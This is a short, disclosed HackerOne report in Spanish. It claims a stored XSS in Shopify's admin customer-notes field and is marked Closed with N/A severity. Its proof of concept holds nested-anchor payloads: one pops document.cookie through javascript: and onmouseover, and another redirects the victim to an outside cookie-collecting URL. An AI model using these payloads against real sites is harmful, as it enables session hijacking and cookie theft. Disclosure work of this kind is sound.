# xss stored

## Report Details
- **Report ID**: 798599
- **URL**: https://hackerone.com/reports/798599
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-02-18T03:32:35.642Z
- **Disclosed**: 2020-04-03T07:27:26.531Z

## Reporter
- **Username**: davscol94
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Se encuentra un xss en las notas del cliente se requiere inicio de session, se encuentra en el campo notas de cliente

POC

https://macken22jorg.myshopify.com/admin/customers
https://macken22jorg.myshopify.com/admin/customers/2901321318444


<h1>holaaaaaaa||<a href="http://<a href="http://<a href="http://<a href="javascript:alert(document.cookie)" onmouseover="javascript:alert(document.cookie)">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">gle.com</a>  hhh

<h1>holaaaaaaa||<a href="http://<a href="http://<a href="http://<a href="javascript:window.location='https://growncheckerworl.com/cookie.php?cookie=document.cookie'" >aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">aaaaaaaaaaaaaaaaaaaaaaaaaagle.com</a>">gle.com</a>  hhhk



Referencias:

https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/

## Impact

captura de cookies

## Attachments
- 1.png
- 2.png
- 3.png
- 4.png
- 5.png
